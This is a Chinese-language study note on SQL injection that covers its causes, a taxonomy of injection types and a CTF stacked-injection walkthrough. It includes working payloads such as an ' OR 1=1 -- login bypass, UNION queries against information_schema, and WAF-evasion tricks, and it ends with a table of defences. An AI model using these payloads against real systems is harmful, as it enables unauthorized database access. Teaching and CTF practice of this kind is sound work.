## 二、核心知识要点

### 2.1 SQL注入原理

- **核心概念**：应用程序将用户输入直接拼接到SQL语句中执行，破坏"命令与数据分离"原则
- **漏洞成因**：
  - 输入验证缺失（未过滤特殊字符如'、;、--）
  - 动态SQL使用字符串拼接而非参数化查询
  - 未实施类型/长度检查

### 2.2 SQL注入分类体系

#### 基础注入类型

| 类型             | 原理                                           | 特征                         |
| ---------------- | ---------------------------------------------- | ---------------------------- |
| **联合查询注入** | 利用UNION操作符合并恶意查询                    | 有回显、需猜测列数和数据类型 |
| **报错注入**     | 构造恶意输入触发数据库错误，从错误信息获取数据 | 页面显示数据库错误信息       |
| **布尔盲注**     | 通过TRUE/FALSE条件判断，页面响应差异推断数据   | 无回显但有页面状态差异       |
| **时间盲注**     | 利用延时函数(SLEEP)判断条件真假                | 完全无回显，通过响应时间判断 |

#### 高级注入技术

| 类型           | 原理                                     | 典型场景               |
| -------------- | ---------------------------------------- | ---------------------- |
| **堆叠注入**   | 使用分号执行多条SQL语句                  | 支持多语句的数据库     |
| **二次注入**   | 恶意数据存入数据库后，在后续查询中被触发 | 数据存储与读取分离     |
| **DNSlog注入** | 通过DNS请求外带数据                      | 目标机无法直接回显     |
| **ORM注入**    | 错误使用HQL等查询语言导致注入            | 使用Hibernate等ORM框架 |

### 2.3 经典攻击案例

#### 案例1：万能密码绕过

```sql
-- 原始SQL
SELECT * FROM users WHERE username='$user' AND password='$pwd'

-- 攻击输入（用户名）
' OR 1=1 --

-- 实际执行
SELECT * FROM users WHERE username='' OR 1=1 --' AND password=''
```

#### 案例2：UNION联合查询注入

```sql
-- 判断列数
' ORDER BY 3 --

-- 获取表名
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables --

-- 获取flag
' UNION SELECT 1,2,flag FROM secret_table --
```

#### 案例3：CTF实战 - supersqli堆叠注入

- 场景：过滤了SELECT等关键词
- 攻击手法：使用堆叠注入 + rename + alter 修改表结构
- 关键步骤：
  1. `1';show tables;` 列出所有表
  2. `1';rename words to test;` 重命名表
  3. `1';rename `1919810931114514` to words;` 把flag表改成words
  4. `1';show columns from words;` 获取flag

### 2.4 高级技术话题

#### 绕过WAF技术

- 大小写混合：`UnIoN SeLeCt`
- URL编码绕过
- 注释混淆：`/*!UNION*/`
- 空白符替换
- SQL注释替代空格

#### 防御技术

| 防御手段         | 说明                                |
| ---------------- | ----------------------------------- |
| **参数化查询**   | 使用预编译语句，将SQL模板与参数分离 |
| **输入验证**     | 白名单校验，限制类型和长度          |
| **最小权限**     | 数据库账户仅授予必要权限            |
| **错误隐藏**     | 生产环境禁止数据库错误回显          |
| **WAF部署**      | Web应用防火墙过滤常见Payload        |
| **定期渗透测试** | 使用Burp Suite、sqlmap等工具检测    |
